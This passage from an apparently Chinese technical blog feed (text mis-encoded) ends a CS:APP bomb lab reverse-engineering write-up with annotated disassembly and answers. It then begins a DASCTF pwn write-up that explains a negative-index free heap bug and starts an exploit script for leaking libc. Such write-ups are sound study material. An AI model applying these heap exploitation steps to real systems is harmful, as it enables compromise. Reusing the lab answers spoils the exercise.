class="keyword">call</span>   <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"><span class="number">0x00000000004010ee</span> &lt;+<span class="number">140</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x00000000004010f2</span> &lt;+<span class="number">144</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x00000000004010f3</span> &lt;+<span class="number">145</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p><p>å¾ˆæ˜¾ç„¶æ˜¯ä¸€ä¸ªå¤§å¾ªç¯<br>åŠ¨è°ƒå‘ç°æœ‰ä¸€ä¸ªç±»ä¼¼äºä»£æ¢è¡¨çš„ä¸œè¥¿ï¼Œéœ€è¦åœ¨å¾ªç¯ä¸­ç»™å‡ºç´¢å¼•ï¼Œç„¶åæŸ¥è¡¨ï¼Œæœ€åå’Œå­—ç¬¦ä¸²å¯¹æ¯”</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="number">0x4024B0</span></span><br><span class="line"><span class="number">0x4024b0</span> &lt;<span class="built_in">array</span>&gt;:<span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="number">0x40245e</span></span><br><span class="line"><span class="number">0x40245e</span>:<span class="string">&quot;flyers&quot;</span></span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯å–å‰é¢çš„<code>maduiersnfotvbyl</code><br>ç´¢å¼•å€¼ä¸º[9, 15, 14, 5, 6, 7]<br>å–asciiç å€¼å’Œ0xfä¸åç­‰äºç´¢å¼•å€¼å³å¯, â€œyonefgâ€œ</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>éƒ¨åˆ†æ±‡ç¼–ä»£ç å¦‚ä¸‹</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000401106</span> &lt;+<span class="number">18</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40145c</span> &lt;read_six_numbers&gt;</span><br><span class="line">   <span class="number">0x000000000040110b</span> &lt;+<span class="number">23</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">r14</span>,<span class="built_in">rsp</span></span><br><span class="line">   <span class="number">0x000000000040110e</span> &lt;+<span class="number">26</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">r12d</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401114</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">r13</span></span><br><span class="line">   # <span class="built_in">rsp</span> = <span class="built_in">rbp</span> éƒ½æŒ‡å‘æˆ‘ä»¬è¾“å…¥çš„<span class="number">6</span>ä¸ªæ•°å­—ï¼Œé€šè¿‡æ ˆä¼ é€’å‚æ•°ï¼Œè¿”å›å€¼å­˜å…¥<span class="built_in">rax</span></span><br><span class="line">   <span class="number">0x0000000000401117</span> &lt;+<span class="number">35</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">r13</span>+<span class="number">0x0</span>]</span><br><span class="line">   # è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—è¿›å…¥<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x000000000040111b</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040111e</span> &lt;+<span class="number">42</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401121</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">jbe</span>    <span class="number">0x401128</span> &lt;phase_6+<span class="number">52</span>&gt;</span><br><span class="line">   # -<span class="number">1</span> åå’Œ<span class="number">5</span>è¿›è¡Œæ¯”è¾ƒ, å°äºç­‰äºåˆ™è·³è½¬ï¼Œå³ç¬¬ä¸€ä½æ•°å­—å¿…é¡»å°äº<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401123</span> &lt;+<span class="number">47</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401128</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">add</span>    <span class="built_in">r12d</span>,<span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040112c</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">r12d</span>,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401130</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">je</span>     <span class="number">0x401153</span> &lt;phase_6+<span class="number">95</span>&gt;</span><br><span class="line"><span class="symbol">loop1:</span></span><br><span class="line">   # è·³å‡ºå¾ªç¯</span><br><span class="line">   <span class="number">0x0000000000401132</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">r12d</span></span><br><span class="line">    # å¾ªç¯ä¸­çš„ç¬¬äºŒå±‚å¾ªç¯</span><br><span class="line">   <span class="number">0x0000000000401135</span> &lt;+<span class="number">65</span>&gt;:<span class="keyword">movsxd</span> <span class="built_in">rax</span>,<span class="built_in">ebx</span></span><br><span class="line">   <span class="number">0x0000000000401138</span> &lt;+<span class="number">68</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rax</span>*<span class="number">4</span>]</span><br><span class="line">        # ç´¢å¼•å–å‡ºæ•°å­—</span><br><span class="line">   <span class="number">0x000000000040113b</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>+<span class="number">0x0</span>],<span class="built_in">eax</span></span><br><span class="line">        # æ¯”è¾ƒå–å‡ºçš„æ•°å­—æ˜¯å¦å’Œç¬¬ä¸€ä¸ªæ•°å­—ç›¸åŒï¼Œç›¸åŒåˆ™çˆ†ç‚¸</span><br><span class="line">   <span class="number">0x000000000040113e</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401145</span> &lt;phase_6+<span class="number">81</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401140</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401145</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">add</span>    <span class="built_in">ebx</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000401148</span> &lt;+<span class="number">84</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ebx</span>,<span class="number">0x5</span></span><br><span class="line">        # <span class="built_in">ebx</span> = <span class="number">1</span>-<span class="number">6</span>ï¼Œæ¯”è¾ƒæ‰€æœ‰çš„æ•°å­—</span><br><span class="line">   <span class="number">0x000000000040114b</span> &lt;+<span class="number">87</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401135</span> &lt;phase_6+<span class="number">65</span>&gt;</span><br><span class="line">    # è·³å‡ºç¬¬äºŒå±‚å¾ªç¯</span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040114d</span> &lt;+<span class="number">89</span>&gt;:<span class="keyword">add</span>    <span class="built_in">r13</span>,<span class="number">0x4</span></span><br><span class="line">    # åŠ¨è°ƒå‘ç°<span class="built_in">r13</span>æŒ‡å‘ç¬¬ä¸€ä¸ªæ•°å­—ï¼Œ+<span class="number">4</span>åæŒ‡å‘ç¬¬äºŒä¸ªæ•°å­—</span><br><span class="line">   <span class="number">0x0000000000401151</span> &lt;+<span class="number">93</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401114</span> &lt;phase_6+<span class="number">32</span>&gt;</span><br><span class="line">    # å¾ªç¯ï¼Œé€€å‡ºæ¡ä»¶ä¸º<span class="built_in">r12d</span> = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loop2:</span></span><br><span class="line">   <span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rsi</span>,[<span class="built_in">rsp</span>+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">r14</span></span><br><span class="line">   <span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="number">0x7</span></span><br><span class="line">   # å¾ªç¯å¼€å§‹</span><br><span class="line">   <span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">ecx</span></span><br><span class="line">   <span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line">   <span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>],<span class="built_in">edx</span></span><br><span class="line">    # æ•°å­— = <span class="built_in">edx</span>( <span class="number">0x7</span> - æ•°å­—)</span><br><span class="line">   <span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="built_in">rsi</span></span><br><span class="line">   <span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401160</span> &lt;phase_6+<span class="number">108</span>&gt;</span><br><span class="line">    # é€€å‡ºæ¡ä»¶ï¼šå½“å‰æ•°å­—ä¸º<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>loop1ä¸­ä¸»è¦æ˜¯æ¯”è¾ƒå…­ä¸ªæ•°å­—ä¸­æ˜¯å¦æœ‰ç›¸åŒçš„æ•°å­—</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x000000000040116f</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x0</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">0x0000000000401174</span> &lt;+<span class="number">128</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401197</span> &lt;phase_6+<span class="number">163</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="symbol">loop3:</span></span><br><span class="line">   <span class="number">0x0000000000401176</span> &lt;+<span class="number">130</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x8</span>]</span><br><span class="line">   # nodeèŠ‚ç‚¹</span><br><span class="line">   <span class="number">0x000000000040117a</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040117d</span> &lt;+<span class="number">137</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">   <span class="number">0x000000000040117f</span> &lt;+<span class="number">139</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">   # å¾ªç¯ï¼Œä¸€ç›´åˆ°<span class="built_in">eax</span>å’Œæ•°å­—ç›¸ç­‰</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401181</span> &lt;+<span class="number">141</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401188</span> &lt;phase_6+<span class="number">148</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401183</span> &lt;+<span class="number">143</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x6032d0</span></span><br><span class="line">   <span class="number">0x0000000000401188</span> &lt;+<span class="number">148</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rsi</span>*<span class="number">2</span>+<span class="number">0x20</span>],<span class="built_in">rdx</span></span><br><span class="line">   # å°†nodeèŠ‚ç‚¹å­˜å…¥åˆ°æ ˆç©ºé—´ä¸­</span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040118d</span> &lt;+<span class="number">153</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsi</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401191</span> &lt;+<span class="number">157</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rsi</span>,<span class="number">0x18</span></span><br><span class="line">   # ä¸€ç›´åˆ°<span class="built_in">rsi</span>=<span class="number">0x18</span>ï¼Œå³éå†å®Œå…¨<span class="number">6</span>ä¸ªæ•°å­—</span><br><span class="line">   <span class="number">0x0000000000401195</span> &lt;+<span class="number">161</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401197</span> &lt;+<span class="number">163</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rsi</span>*<span class="number">1</span>]</span><br><span class="line">   <span class="number">0x000000000040119a</span> &lt;+<span class="number">166</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="number">0x1</span></span><br><span class="line">   # ç¬¬ä¸€ä¸ªæ•°å­—</span><br><span class="line">   <span class="number">0x000000000040119d</span> &lt;+<span class="number">169</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401183</span> &lt;phase_6+<span class="number">143</span>&gt;</span><br><span class="line">   # å¦‚æœå°äºç­‰äºåˆ™å‘ä¸Šè·³</span><br><span class="line">   <span class="number">0x000000000040119f</span> &lt;+<span class="number">171</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011a4</span> &lt;+<span class="number">176</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x6032d0</span> </span><br><span class="line">   # <span class="number">0x6032d0</span> -&gt; <span class="number">0x000000010000014c</span></span><br><span class="line">   <span class="number">0x00000000004011a9</span> &lt;+<span class="number">181</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">    # å‘ä¸Šè·³</span><br></pre></td></tr></table></figure><p>è¿™ä¸€éƒ¨åˆ†ä¹Ÿè¯¦ç»†å†™å…¥æ³¨é‡Šä¸­<br>ç»è¿‡åŠ¨è°ƒå‘ç°å®ç°äº†å°†è¾“å…¥çš„æ•°å­—å‡å»7ï¼Œå¹¶ä¸”å°†å¯¹åº”çš„nodeèŠ‚ç‚¹éƒ½ç§»åŠ¨åˆ°æ ˆä¸­</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rax</span>,[<span class="built_in">rsp</span>+<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rsi</span>,[<span class="built_in">rsp</span>+<span class="number">0x50</span>]</span><br><span class="line"><span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">rbx</span></span><br><span class="line"># start</span><br><span class="line"><span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rcx</span>+<span class="number">0x8</span>],<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</span><br><span class="line"># end  éå†å…­ä¸ªnode</span><br><span class="line"><span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x8</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="number">0x5</span></span><br><span class="line"><span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>],<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;</span><br><span class="line"># å¦‚æœå‰ä¸€ä¸ªèŠ‚ç‚¹å¤§äºåä¸€ä¸ªèŠ‚ç‚¹åˆ™ä¸ä¼šè·³è½¬</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">ebp</span>,<span class="number">0x1</span></span><br><span class="line"><span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x50</span></span><br><span class="line"><span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>å¯¹æ¯”äº†nodeèŠ‚ç‚¹ä¸­çš„æ•°æ®çš„å¤§å°ï¼Œæˆ‘ä»¬é‡å¯ç¨‹åºï¼ŒæŸ¥çœ‹åŸç”Ÿçš„nodeèŠ‚ç‚¹æƒ…å†µå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x6032d0</span></span><br><span class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:<span class="number">0x000000010000014c</span><span class="number">0x00000000006032e0</span></span><br><span class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:<span class="number">0x00000002000000a8</span><span class="number">0x00000000006032f0</span></span><br><span class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:<span class="number">0x000000030000039c</span><span class="number">0x0000000000603300</span></span><br><span class="line"><span class="number">0x603300</span> &lt;node4&gt;:<span class="number">0x00000004000002b3</span><span class="number">0x0000000000603310</span></span><br><span class="line"><span class="number">0x603310</span> &lt;node5&gt;:<span class="number">0x00000005000001dd</span><span class="number">0x0000000000603320</span></span><br><span class="line"><span class="number">0x603320</span> &lt;node6&gt;:<span class="number">0x00000006000001bb</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>å¤§å°é¡ºåºä¸º 3 4 5 6 1 2<br>é‚£ä¹ˆå˜æ¢åæ˜¯è¿™äº›ï¼Œå˜æ¢å‰å°±æ˜¯ 4 3 2 1 6 5</p><p><img src="https://i.loli.net/2021/06/15/8TIOF7ofxShwHuX.png" alt=""></p><h2 id="åé¦ˆä¸æ€»ç»“"><a href="#åé¦ˆä¸æ€»ç»“" class="headerlink" title="åé¦ˆä¸æ€»ç»“"></a>åé¦ˆä¸æ€»ç»“</h2><p>  é€šè¿‡è¿™ä¸ªå®éªŒå¤ä¹ äº†ä¸€äº›æ±‡ç¼–çš„çŸ¥è¯†ï¼Œå¾ˆå¤§æ”¶è·ï¼Œä¹‹å‰ä¹ æƒ¯äºçœ‹cä»£ç ï¼Œæ‰å‘ç°è¯»æ±‡ç¼–çš„èƒ½åŠ›æ˜¯å¦‚æ­¤ä¹‹å¼±</p><ol><li>objdump -d -m æŒ‡ä»¤æ ¼å¼ ./binary_file &gt; xxx.asm  åæ±‡ç¼–å‡ºæ–‡ä»¶</li><li>å‡½æ•°çš„è¿ç»­è°ƒç”¨çš„å¯„å­˜å™¨å‚æ•°å˜åŒ–ï¼Œä¾ç„¶æ˜¯rdiç­‰å¯„å­˜å™¨ä¼ è¿›å»</li><li>æ¯…åŠ›ï¼Œè‡ªåˆ¶åŠ›å’Œä¸“æ³¨åŠ›</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> cmu lab </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-MAY pwn wp</title>
      <link href="2021/06/05/DASCTF-MAY/"/>
      <url>2021/06/05/DASCTF-MAY/</url>
      
        <content type="html"><![CDATA[<p>ä¸¤é“é¢˜éƒ½æ¯”è¾ƒä¸­è§„ä¸­çŸ©ï¼Œç¬¬äºŒä¸ªæ¯”ç¬¬ä¸€ä¸ªè¿˜ç®€å•ï¼Œç¬¬ä¸€ä¸ªæ¯”èµ›ä¸€å¼€å§‹æƒ³æ­ªäº†ï¼Œåšäº†å¾ˆjbä¹…ï¼Œç¬¬äºŒä¸ªåå‡ åˆ†é’Ÿå°±å‡ºäº†</p><h2 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h2><p>ä¸€ä¸ªæ¯”è¾ƒå…¸å‹çš„å †èœå•é¢˜ç›®</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é€†å‘çš„è¯å€’æ˜¯ä¸éš¾ï¼Œç›´æ¥çœ‹æ¼æ´ï¼Œé¦–å…ˆæ˜¯freeä¸­ï¼Œä¸€çœ¼çœ‹è¿‡å»å‘ç°è¿™ä¸å°±æ˜¯uafä¹ˆï¼Œfreeçš„æ˜¯æŒ‡é’ˆï¼Œæœ¬åº”è¯¥æ¸…ç©ºæŒ‡é’ˆå’Œsizeï¼Œå´åªæ¸…ç©ºäº†size</p><p><img src="https://i.loli.net/2021/06/05/1PVwZi3z5eNS98B.png" alt=""></p><p>ä½†æ˜¯åæœŸè°ƒè¯•çš„æ—¶å€™å‘ç°å¹¶ä¸æ˜¯è¿™æ ·çš„ï¼Œå› ä¸ºæ‰€æœ‰çš„editå’ŒshowåŠŸèƒ½éƒ½æ˜¯æ ¹æ®sizeæ¥åˆ¤æ–­çš„ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ¸…ç©ºäº†æŒ‡é’ˆï¼Œè¿™ä¸ªåœ°æ–¹å¹¶ä¸å­˜åœ¨uaf</p><p>ç„¶ååˆä»”ç»†ä¸€çœ‹ï¼Œå‘ç°çœŸæ­£çš„æ¼æ´å…¶å®åœ¨è¿™ã€‚<br><img src="https://i.loli.net/2021/06/05/5khUEDn8WRHNi1u.png" alt=""></p><p>freeçš„æ—¶å€™æ²¡æœ‰åˆ¤æ–­indexå°äº0çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä»¥bssä¸­çš„å­˜æ”¾å †æŒ‡é’ˆçš„ä½ç½®ä¸ºåæ ‡åŸç‚¹ï¼Œå‘ä¹‹å‰çš„åœ°å€è¿›è¡Œfreeï¼Œçªç„¶è”æƒ³åˆ°äº†ä¹‹å‰è®©è¾“å…¥å§“åï¼Œå¯èƒ½å°±æ˜¯ç»™æˆ‘ä»¬ä¼ªé€ å †åœ°å€åˆ›é€ äº†æ¡ä»¶ï¼Œæˆ‘ä»¬è¿›å…¥gdbæ¥æŸ¥çœ‹ä»–ä»¬æ˜¯å¦‚ä½•åˆ†å¸ƒçš„ã€‚</p><p><img src="https://i.loli.net/2021/06/05/lIa76K9eDxZ3fFP.png" alt=""><br>å‘ç°è¿™ä¸å°±åœ¨å †æŒ‡é’ˆçš„ä¸Šæ–¹ä¹ˆï¼Œæ‰€ä»¥å¾ˆè‡ªç„¶çš„æ€è·¯å°±å‡ºæ¥äº†ï¼Œå°±æ˜¯å‘å‰freeï¼Œç”¨ä¹‹å‰èƒ½å¤Ÿè¾“å…¥çš„ageå½“åšå †æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªä¼ªé€ çš„chunkï¼Œè¿™ä¸ªä¼ªé€ çš„chunkå¯ä»¥ç”±æˆ‘ä»¬æ¥æ„é€ å †å—çš„sizeæ¥å†³å®šã€‚</p><p>å¦‚ä¸‹éƒ¨åˆ†exp<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆæ˜¯å…ˆæ³„éœ²å‡ºæ¥libcåœ°å€ï¼Œè¿™ä¸ªç®€å•ï¼Œfree unsorted binåå†å–å›æ¥å°±å¯ä»¥äº†</span></span><br><span class="line">fillInfo(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x21</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">296</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span 